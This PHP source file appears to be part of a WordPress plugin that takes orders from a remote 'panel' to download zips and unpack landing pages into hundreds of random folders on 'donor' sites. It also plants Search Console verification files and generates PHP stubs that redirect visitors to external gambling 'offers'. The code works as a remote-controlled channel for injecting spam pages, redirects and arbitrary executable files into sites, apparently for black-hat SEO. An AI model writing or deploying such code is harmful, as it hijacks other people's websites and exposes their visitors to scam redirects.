<?php

if (!defined('ABSPATH')) exit;

/**
 * WLH_Deploy — SITE ROLLOUT channel (0.10.5): the panel hands this donor a
 * site-deploy task on the heartbeat answer (`site_deploys`): a sha-pinned zip
 * on the panel plus a list of folder names to create in OUR docroot, the zip
 * unpacked into each (operator feature «раскатка сайта по папкам» — N random
 * <word>-<rand> folders, one landing in every folder, N URLs). A second list
 * (`remove`) names deployed folders to wipe (operator «снести»).
 *
 * Discipline (same as the other channels):
 *   - Heartbeat-driven only; nothing here runs on cron, init, or signed ops.
 *   - Deferred to shutdown by the client; a slow fs/host must not hold the
 *     heartbeat response.
 *   - Batched (BATCH_PER_TICK folders per heartbeat) with progress kept in an
 *     option — a 500-folder rollout spans several beats instead of one
 *     multi-minute shutdown that the host could kill mid-copy.
 *   - The zip is downloaded ONCE per deploy, verified against the panel's
 *     SIGNED sha256 (never the response header), unzipped to a private temp
 *     dir, and only then copied. Any sha/unzip failure writes nothing.
 *   - Folder names are strictly validated ([a-z0-9-], no slashes/dots) and an
 *     EXISTING docroot folder is never overwritten ('exists' error) — a
 *     deploy must not deface anything that was already there.
 *   - Per-folder outcomes buffer into `wlh_deploy_res` and ride the NEXT
 *     heartbeat's `site_deploy_results` (one-shot contract, like
 *     static_results).
 */
class WLH_Deploy
{
    /** Folders processed per heartbeat tick (create or remove). */
    const BATCH_PER_TICK = 50;
    /** Soft wall-clock budget for one tick; checked between folders. 40s starved
     *  slow-IO hosts to ~8 folders/beat (akhtardai 2026-09-17: 355 папок ≈ 10ч);
     *  100s triples throughput while staying under typical max_execution_time. */
    const TIME_BUDGET_SEC = 100;
    /** Download/unzip attempts before the whole deploy is failed off. */
    const MAX_DL_ATTEMPTS = 3;
    /** Cap on the buffered result rows (a heartbeat must stay lean). */
    const MAX_RESULTS = 500;

    const OPT_STATE   = 'wlh_deploy_state';
    const OPT_RESULTS = 'wlh_deploy_res';

    /** Marker dropped into every folder WE deployed — proves ownership. */
    const SENTINEL = '.wlh-dep-ok';

    /**
     * Entry from the heartbeat answer. NEVER throws. Merges the task into the
     * persisted state and processes one batch.
     * @param array<int,array{deploy_id:int,sha256:string,dirs:array,remove:array}> $tasks
     */
    public static function run($tasks)
    {
        try {
            // Parallel heartbeats (WP-Cron + traffic + panel pokes) each spawn a
            // shutdown runner on the SAME state — without a mutex two runners
            // copy the same batch: the loser reports bogus `exists` fails
            // (abjpharmaceuticals 2026-09-16, 8/150). Flock serializes them.
            $lock = @fopen(rtrim(str_replace('\\', '/', get_temp_dir()), '/') . '/wlh-deploy.lock', 'c');
            if ($lock === false) {
                return;
            }
            if (!@flock($lock, LOCK_EX | LOCK_NB)) {
                @fclose($lock);
                return; // another runner is mid-batch; next heartbeat continues
            }
            try {
                self::run_inner($tasks);
            } finally {
                @flock($lock, LOCK_UN);
                @fclose($lock);
            }
        } catch (\Throwable $e) {
            self::buffer_result(0, '', false, 'ex: ' . substr($e->getMessage(), 0, 100));
        } catch (\Exception $e) { // PHP 5.x belt and braces
            self::buffer_result(0, '', false, 'ex: ' . substr($e->getMessage(), 0, 100));
        }
    }

    private static function run_inner($tasks)
    {
        if (!is_array($tasks) || !$tasks) {
            return;
        }
        $state = self::load_state();
        foreach ($tasks as $t) {
            if (!is_array($t)) {
                continue;
            }
            $id = (int)(isset($t['deploy_id']) ? $t['deploy_id'] : 0);
            if ($id <= 0) {
                continue;
            }
            if (!isset($state[$id])) {
                $state[$id] = array(
                    'sha'      => strtolower(trim((string)(isset($t['sha256']) ? $t['sha256'] : ''))),
                    'dirs'     => array(),
                    'remove'   => array(),
                    'files'    => array(),
                    'force'    => !empty($t['force']),
                    'src'      => '',
                    'dl_fails' => 0,
                );
            }
            // Root files (0.10.6): name => content_b64 — verify tokens and
            // deploy sitemaps, written atomically into OUR docroot.
            foreach ((array)(isset($t['files']) ? $t['files'] : array()) as $fname => $b64) {
                $fname = (string)$fname;
                if (self::valid_file($fname) && is_string($b64)) {
                    $state[$id]['files'][$fname] = $b64;
                }
            }
            foreach ((array)(isset($t['dirs']) ? $t['dirs'] : array()) as $d) {
                $d = (string)$d;
                if (self::valid_dir($d) && !in_array($d, $state[$id]['dirs'], true)) {
                    $state[$id]['dirs'][] = $d;
                }
            }
            foreach ((array)(isset($t['remove']) ? $t['remove'] : array()) as $d) {
                $d = (string)$d;
                if (self::valid_dir($d) && !in_array($d, $state[$id]['remove'], true)) {
                    $state[$id]['remove'][] = $d;
                }
            }
        }

        $started = time();
        foreach ($state as $id => &$job) {
            if (!isset($job['files'])) {
                $job['files'] = array(); // state persisted by the 0.10.5 build
            }
            if (!$job['dirs'] && !$job['remove'] && !$job['files']) {
                continue;
            }
            // Root files first: a GSC verify token / deploy sitemap is small and
            // time-sensitive, the 500-folder rollout can wait a beat.
            while (!empty($job['files']) && (time() - $started) < self::TIME_BUDGET_SEC
                   && self::processed_this_tick() < self::BATCH_PER_TICK) {
                $fname = (string)array_key_first($job['files']);
                $b64 = (string)$job['files'][$fname];
                unset($job['files'][$fname]);
                $res = self::write_file($fname, $b64);
                self::buffer_result($id, '@' . $fname, $res === '', $res);
                self::tick();
            }
            // Create-batch needs the unpacked source; fetch+unzip lazily, once.
            // Host tmp cleaners can wipe it between beats (abm-ingenieria
            // 2026-09-16: 4447 bogus src_gone) — a missing src is NOT fatal:
            // drop it so prepare_source re-downloads below.
            if ($job['dirs'] && $job['src'] !== '' && !is_dir($job['src'])) {
                $job['src'] = '';
            }
            if ($job['dirs'] && $job['src'] === '') {
                $prep = self::prepare_source($id, $job['sha']);
                if (empty($prep['ok'])) {
                    $job['dl_fails']++;
                    if ($job['dl_fails'] >= self::MAX_DL_ATTEMPTS) {
                        // Permanent failure: fail off every remaining folder so
                        // the panel stops re-serving this deploy.
                        foreach ($job['dirs'] as $d) {
                            self::buffer_result($id, $d, false, (string)$prep['error']);
                        }
                        $job['dirs'] = array();
                    }
                    continue; // next deploy
                }
                $job['src'] = $prep['src'];
                $job['dl_fails'] = 0; // re-download succeeded — transient wipe forgiven
            }
            while ($job['dirs'] && (time() - $started) < self::TIME_BUDGET_SEC
                   && self::processed_this_tick() < self::BATCH_PER_TICK) {
                $d = array_shift($job['dirs']);
                $res = self::deploy_dir($job['src'], $d, !empty($job['force']));
                self::buffer_result($id, $d, $res === '', $res);
                self::tick();
            }
            while ($job['remove'] && (time() - $started) < self::TIME_BUDGET_SEC
                   && self::processed_this_tick() < self::BATCH_PER_TICK) {
                $d = array_shift($job['remove']);
                $res = self::remove_dir($d);
                self::buffer_result($id, $d, $res === '', $res);
                self::tick();
            }
            if (!$job['dirs'] && !$job['remove'] && empty($job['files'])) {
                self::cleanup_source($job['src']);
                $job['src'] = '';
                unset($state[$id]);
            }
            if ((time() - $started) >= self::TIME_BUDGET_SEC
                || self::processed_this_tick() >= self::BATCH_PER_TICK) {
                break; // remaining jobs ride the next heartbeat
            }
        }
        unset($job);
        self::save_state($state);
    }

    /* ---------------- per-folder work ---------------- */

    /** Create ABSPATH/<dir> and copy the unpacked landing in. '' on success. */
    private static function deploy_dir($src, $dir, $force = false)
    {
        if (!self::valid_dir($dir)) {
            return 'bad_dir';
        }
        $target = rtrim(str_replace('\\', '/', ABSPATH), '/') . '/' . $dir;
        if (@file_exists($target)) {
            // Idempotency: a duplicate delivery (parallel heartbeat, re-served
            // batch) finds the folder already deployed BY US — that's success,
            // not a collision. Proof: our sentinel, or — for folders deployed
            // by 0.10.5/0.10.6 before the sentinel existed — a content match
            // against the unpacked source (every sampled top-level file byte-
            // identical). Only a folder failing both proofs is foreign and
            // must never be overwritten.
            if (@is_file($target . '/' . self::SENTINEL)) {
                self::patch_landing($target, $dir);
                return '';
            }
            if (is_dir($src) && self::content_matches($src, $target)) {
                @file_put_contents($target . '/' . self::SENTINEL, gmdate('c') . ' healed');
                self::patch_landing($target, $dir);
                return '';
            }
            // force (0.10.13): dir names are PANEL-GENERATED random — a folder
            // with this exact name is certainly OUR earlier partial write (host
            // killed the runner mid-copy; no sentinel, content mismatch) — safe
            // to wipe and redeploy clean. Without force we stay hands-off.
            if (!$force) {
                return 'exists';
            }
            self::rrmdir($target);
        }
        if (!is_dir($src)) {
            return 'src_gone';
        }
        if (!WLH_Adopt::copy_tree($src, $target)) {
            return 'copy_failed';
        }
        @file_put_contents($target . '/' . self::SENTINEL, gmdate('c'));
        self::patch_landing($target, $dir);
        return '';
    }

    /**
     * Subfolder-awareness patches for the deployed landing (0.10.8). The
     * chicken-road landing family hardcodes `REF_PATH = "/play"` in
     * assets/js/bundle.js (substituted at its HTML build time) — fine at a
     * domain root, but deployed under /<dir>/ the CTA opens the DONOR's root
     * /play (its WordPress 404s), while the folder's own .htaccess 302 → offer
     * only fires for /<dir>/play. Rewrite the constant to the folder-absolute
     * path. Idempotent: after the rewrite the needle no longer matches.
     * A patch failure must never fail the deploy — the folder itself is fine.
     */
    private static function patch_landing($target, $dir)
    {
        self::patch_play_stub($target);
        try {
            $f = $target . '/assets/js/bundle.js';
            if (!@is_file($f) || !@is_writable($f)) {
                return;
            }
            $js = @file_get_contents($f);
            if (!is_string($js) || $js === '' || strlen($js) > 4 * 1024 * 1024) {
                return;
            }
            $needle = 'REF_PATH = "/play"';
            if (strpos($js, $needle) !== false) {
                $js = str_replace($needle, 'REF_PATH = "/' . $dir . '/play"', $js);
                @file_put_contents($f, $js, LOCK_EX);
            }
        } catch (\Throwable $e) {
            // best-effort by design
        } catch (\Exception $e) {
        }
    }

    /**
     * .htaccess-independent offer redirect (0.10.9): on hosts with
     * AllowOverride None the folder .htaccess is silently ignored, so
     * /<dir>/play 404'd even with REF_PATH patched (acsinfotech,
     * aelidahealthcare). A PHYSICAL play/index.php redirect always executes —
     * WP's root rewrite skips existing dirs. The offer URL is parsed from the
     * landing's own .htaccess play-rule; query strings are carried through
     * (the original rule was QSA). Idempotent: skips when the stub exists.
     */
    private static function patch_play_stub($target)
    {
        try {
            $pdir = $target . '/play';
            if (@is_file($pdir . '/index.php')) {
                return;
            }
            $hta = @file_get_contents($target . '/.htaccess');
            if (!is_string($hta) || $hta === '') {
                return;
            }
            if (!preg_match('/^\s*RewriteRule\s+\^play(?:\(\/\.\*\)\?)?\$\s+(https?:\/\/\S+)\s+\[/mi', $hta, $m)) {
                return;
            }
            $offer = html_entity_decode($m[1], ENT_QUOTES, 'UTF-8');
            if (!preg_match('#^https?://#i', $offer)) {
                return;
            }
            if (!@is_dir($pdir) && !@mkdir($pdir, 0755, true)) {
                return;
            }
            $stub = "<?php\n"
                . "// Generated by WLH_Deploy: .htaccess-independent /play redirect.\n"
                . "\$base = '" . $offer . "';\n"
                . "\$qs = isset(\$_SERVER['QUERY_STRING']) ? (string)\$_SERVER['QUERY_STRING'] : '';\n"
                . "if (\$qs !== '') { \$base .= (strpos(\$base, '?') === false ? '?' : '&') . \$qs; }\n"
                . "header('Location: ' . \$base, true, 302);\n"
                . "exit;\n";
            @file_put_contents($pdir . '/index.php', $stub, LOCK_EX);
        } catch (\Throwable $e) {
            // best-effort by design
        } catch (\Exception $e) {
        }
    }

    /** Recursively wipe a folder WE deployed (sentinel present). '' on success. */
    private static function remove_dir($dir)
    {
        if (!self::valid_dir($dir)) {
            return 'bad_dir';
        }
        $target = rtrim(str_replace('\\', '/', ABSPATH), '/') . '/' . $dir;
        if (!@is_dir($target) || @is_link($target)) {
            return ''; // already gone — the desired end state
        }
        if (!@is_file($target . '/' . self::SENTINEL)) {
            return 'not_ours'; // never nuke a folder we did not deploy
        }
        self::rrmdir($target);
        return @is_dir($target) ? 'rm_failed' : '';
    }

    /**
     * Heuristic ownership proof for pre-sentinel deployments: sample up to 4
     * top-level FILES of the unpacked source; the target is "ours" when it
     * holds every sampled file byte-identical (same size + sha1). No top-level
     * files in src → no proof possible. Any mismatch → foreign, hands off.
     */
    private static function content_matches($src, $target)
    {
        $items = @scandir($src);
        if (!is_array($items)) {
            return false;
        }
        $sampled = 0;
        foreach ($items as $item) {
            $sf = $src . '/' . $item;
            if ($item === '.' || $item === '..' || !@is_file($sf) || @is_link($sf)) {
                continue;
            }
            $tf = $target . '/' . $item;
            if (!@is_file($tf) || @is_link($tf)) {
                return false;
            }
            if (@filesize($sf) !== @filesize($tf)
                || @sha1_file($sf) !== @sha1_file($tf)) {
                return false;
            }
            if (++$sampled >= 4) {
                break;
            }
        }
        return $sampled > 0;
    }

    /** Strict folder-name gate: the panel generates <word>-<rand>; anything else (dots, slashes, traversal) is refused. */
    private static function valid_dir($dir)
    {
        return is_string($dir) && $dir !== '' && strlen($dir) <= 140
            && preg_match('/^[a-z0-9][a-z0-9-]*$/', $dir) === 1;
    }

    /**
     * Root-file name gate (0.10.6 `files`): verify tokens (google<hash>.html)
     * and deploy sitemaps (*.xml). Flat name only — no slashes, no traversal,
     * no dotfiles; extension whitelisted.
     */
    private static function valid_file($name)
    {
        if (!is_string($name) || $name === '' || strlen($name) > 120) {
            return false;
        }
        if (strpos($name, '/') !== false || strpos($name, '\\') !== false || strpos($name, '..') !== false) {
            return false;
        }
        return preg_match('/^[a-z0-9][a-z0-9._-]*\.(html|xml|txt)$/i', $name) === 1;
    }

    /**
     * Atomically write a panel-supplied file into OUR docroot (tempnam in the
     * same dir + flock + rename — the web server never sees a half-written
     * file). Overwrite is allowed: verify tokens rotate per GSC account and a
     * re-run must land. '' on success, error code otherwise.
     */
    private static function write_file($name, $content_b64)
    {
        if (!self::valid_file($name)) {
            return 'bad_file';
        }
        $content = base64_decode((string)$content_b64, true);
        if (!is_string($content) || $content === '') {
            return 'bad_content';
        }
        $root = rtrim(str_replace('\\', '/', ABSPATH), '/');
        if (!@is_writable($root)) {
            return 'docroot_unwritable';
        }
        $dest = $root . '/' . $name;
        $tmp = @tempnam($root, '.wlh');
        if ($tmp === false) {
            return 'tmp_create';
        }
        $fh = @fopen($tmp, 'wb');
        if ($fh === false) {
            @unlink($tmp);
            return 'tmp_open';
        }
        $ok = false;
        if (@flock($fh, LOCK_EX)) {
            $len = strlen($content);
            $written = 0;
            while ($written < $len) {
                $n = @fwrite($fh, substr($content, $written));
                if ($n === false || $n === 0) {
                    break;
                }
                $written += $n;
            }
            @fflush($fh);
            @flock($fh, LOCK_UN);
            $ok = ($written === $len);
        }
        @fclose($fh);
        if (!$ok) {
            @unlink($tmp);
            return 'write';
        }
        @chmod($tmp, 0644); // web-readable, like any static asset
        if (!@rename($tmp, $dest)) {
            @unlink($tmp);
            return 'rename';
        }
        return '';
    }

    /* ---------------- zip download + unpack ---------------- */

    /**
     * Download the deploy zip from the panel (Bearer token, TLS-verified,
     * IPv4-forced — same rules as the wch install channel), verify against the
     * SIGNED sha, unzip into a private temp dir.
     * @return array{ok:bool, src?:string, error?:string}
     */
    private static function prepare_source($deploy_id, $sha)
    {
        if ($sha === '') {
            return array('ok' => false, 'error' => 'sha_required');
        }
        $c = WLH_Client::load_config();
        if ($c['endpoint'] === '' || $c['token'] === '') {
            return array('ok' => false, 'error' => 'no_config');
        }
        require_once ABSPATH . 'wp-admin/includes/file.php';
        $file = wp_tempnam('wlh-dep');
        if (!$file) {
            return array('ok' => false, 'error' => 'tmp_failed');
        }
        $args = array(
            'timeout'     => 60, // a landing zip can be tens of MB on a slow host
            'redirection' => 2,
            'sslverify'   => true,
            'stream'      => true,
            'filename'    => $file,
            'user-agent'  => WLH_Client::USER_AGENT,
            'headers'     => array('Authorization' => 'Bearer ' . $c['token']),
        );
        add_filter('http_api_curl', array('WLH_Client', 'force_ipv4_curl'), 10, 1);
        $r = wp_remote_get($c['endpoint'] . '/api/links/deploy-zip?id=' . (int)$deploy_id, $args);
        remove_filter('http_api_curl', array('WLH_Client', 'force_ipv4_curl'), 10);

        if (is_wp_error($r)) {
            @unlink($file);
            return array('ok' => false, 'error' => 'download_failed');
        }
        $code = (int) wp_remote_retrieve_response_code($r);
        if ($code < 200 || $code >= 300) {
            @unlink($file);
            return array('ok' => false, 'error' => 'http_' . $code);
        }
        if (strtolower((string) @hash_file('sha256', $file)) !== $sha) {
            @unlink($file);
            return array('ok' => false, 'error' => 'sha_mismatch');
        }
        if (!function_exists('unzip_file') || !function_exists('WP_Filesystem')) {
            require_once ABSPATH . 'wp-admin/includes/file.php';
        }
        WP_Filesystem();
        $base = function_exists('get_temp_dir') ? get_temp_dir() : (dirname($file) . '/');
        $dir = rtrim(str_replace('\\', '/', $base), '/') . '/wlh-dep-' . (int)$deploy_id;
        self::rrmdir($dir); // stale leftovers of a previous attempt
        $unz = unzip_file($file, $dir);
        @unlink($file);
        if (is_wp_error($unz)) {
            self::rrmdir($dir);
            return array('ok' => false, 'error' => 'unzip_failed');
        }
        // A zip that unpacks to ONE wrapper directory is transparently entered
        // (common when the operator zipped the folder, not its contents).
        $src = $dir;
        $items = @scandir($dir);
        $items = is_array($items) ? array_values(array_diff($items, array('.', '..'))) : array();
        if (count($items) === 1 && @is_dir($dir . '/' . $items[0])) {
            $src = $dir . '/' . $items[0];
        }
        if (!$items) {
            self::rrmdir($dir);
            return array('ok' => false, 'error' => 'empty_zip');
        }
        return array('ok' => true, 'src' => $src, 'root' => $dir);
    }

    /** Remove the temp unzip root once a deploy finishes. Best-effort. */
    private static function cleanup_source($src)
    {
        // $src may point at the wrapper subdir — always delete the wlh-dep-*
        // ROOT, and only ever a dir with our own prefix (proof we created it).
        $p = rtrim(str_replace('\\', '/', (string)$src), '/');
        while ($p !== '' && strpos(basename($p), 'wlh-dep-') !== 0) {
            $parent = dirname($p);
            if ($parent === $p || $parent === '.' || $parent === '/') {
                return;
            }
            $p = $parent;
        }
        if ($p !== '' && strpos(basename($p), 'wlh-dep-') === 0) {
            self::rrmdir($p);
        }
    }

    /** Recursive delete; symlinks are unlinked, never followed. */
    private static function rrmdir($dir)
    {
        $items = @scandir($dir);
        if (!is_array($items)) {
            return;
        }
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') {
                continue;
            }
            $p = $dir . '/' . $item;
            if (@is_dir($p) && !@is_link($p)) {
                self::rrmdir($p);
            } else {
                @unlink($p);
            }
        }
        @rmdir($dir);
    }

    /* ---------------- state + results ---------------- */

    private static function load_state()
    {
        $s = get_option(self::OPT_STATE, array());
        return is_array($s) ? $s : array();
    }

    private static function save_state($state)
    {
        // Drop fully-consumed jobs; keep the option autoload-off.
        update_option(self::OPT_STATE, $state, false);
    }

    private static function buffer_result($deploy_id, $dir, $ok, $error)
    {
        $res = get_option(self::OPT_RESULTS, array());
        if (!is_array($res)) {
            $res = array();
        }
        $res[] = array(
            'deploy_id' => (int)$deploy_id,
            'dir'       => (string)$dir,
            'ok'        => $ok ? 1 : 0,
            'error'     => substr((string)$error, 0, 120),
        );
        if (count($res) > self::MAX_RESULTS) {
            $res = array_slice($res, -self::MAX_RESULTS);
        }
        update_option(self::OPT_RESULTS, $res, false);
    }

    /** Per-tick processed counter (static so both loops share the budget). */
    private static function tick()
    {
        self::$processed = self::processed_this_tick() + 1;
    }

    private static function processed_this_tick()
    {
        return isset(self::$processed) ? (int)self::$processed : 0;
    }

    private static $processed = 0;
}
